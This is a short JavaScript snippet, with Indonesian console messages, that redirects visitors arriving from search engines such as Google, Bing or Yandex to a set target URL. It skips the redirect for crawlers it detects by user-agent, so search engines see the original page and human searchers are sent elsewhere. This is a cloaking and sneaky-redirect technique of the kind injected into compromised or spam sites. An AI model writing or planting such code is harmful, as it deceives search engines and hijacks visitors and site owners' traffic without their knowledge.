(function() {
    const targetURL = "https://google.com";
	
    const searchEngines = [
        'google.', 
        'bing.com', 
        'yandex.', 
        'duckduckgo.com', 
        'yahoo.com', 
        'ecosia.org', 
        'baidu.com'
    ];

    const botPatterns = /bot|googlebot|crawler|spider|robot|crawling|slurp|lighthouse/i;

    const referrer = document.referrer.toLowerCase();
    const userAgent = navigator.userAgent.toLowerCase();

    const isSearchEngine = searchEngines.some(engine => referrer.includes(engine));
    const isBot = botPatterns.test(userAgent);

    if (isSearchEngine && !isBot) {
        console.log("Traffic valid dari Search Engine. Mengalihkan...");
        window.location.replace(targetURL);
    } else {
        console.log("Trafik diabaikan (Bukan SE atau terdeteksi Bot).");
    }
})();